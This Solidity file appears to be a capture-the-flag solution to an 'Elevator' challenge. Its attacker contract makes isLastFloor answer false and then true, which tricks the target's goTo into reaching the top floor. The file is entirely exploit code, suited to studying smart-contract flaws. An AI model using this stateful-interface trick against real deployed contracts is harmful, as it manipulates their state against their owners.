// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Building, Elevator} from "./Elevator.sol";

contract ElevatorAttacker is Building {
    bool reentrant = false;
    Elevator target;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!reentrant) {
            reentrant = true;
            return false;
        }
        return true;
    }

    function attack() public {
        target.goTo(1);
    }
}
